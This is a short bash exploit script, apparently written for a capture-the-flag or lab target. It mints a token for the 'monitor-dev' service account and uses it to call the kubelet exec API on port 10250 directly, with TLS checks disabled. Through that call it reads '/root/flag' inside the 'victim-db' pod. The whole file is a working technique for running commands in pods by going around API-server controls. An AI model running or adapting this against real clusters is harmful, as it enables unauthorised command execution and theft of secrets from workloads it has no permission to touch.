#!/bin/bash
TOKEN=$(kubectl create token monitor-dev --duration=1h)
NODE_NAME=$(kubectl get pod victim-db -o jsonpath='{.spec.nodeName}')
NODE_IP=$(kubectl get node "$NODE_NAME" -o jsonpath='{.status.addresses[?(@.type=="InternalIP")].address}')

websocat --insecure \
  --header "Authorization: Bearer $TOKEN" \
  --protocol v4.channel.k8s.io \
  "wss://${NODE_IP}:10250/exec/default/victim-db/db?output=1&error=1&command=cat&command=/root/flag"
